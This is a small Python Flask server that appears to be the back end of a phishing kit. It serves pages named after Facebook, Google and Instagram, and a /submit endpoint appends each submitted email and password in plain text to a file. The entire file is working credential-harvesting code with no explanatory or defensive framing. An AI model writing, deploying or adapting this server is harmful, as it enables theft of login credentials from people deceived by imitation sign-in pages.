from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

# Dictionary mapping website names to their corresponding HTML templates
websites = {
    'facebook': 'facebook.html',
    'google': 'google.html',
    'instagram': 'instagram.html'
}

@app.route('/')
def index():
    return "This endpoint is not accessible. Please run the application from the command line."

@app.route('/submit', methods=['POST'])
def submit():
    data = request.json
    email = data.get('email', '')
    password = data.get('password', '')

    # Save the data to a file
    with open('user.txt', 'a') as file:
        file.write(f'Email: {email}, Password: {password}\n')

    return jsonify({'status': 'success'})
@app.route('/<website_name>')
def load_website(website_name):
    if website_name in websites:
        return render_template(websites[website_name])
    else:
        return "Website not found"

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
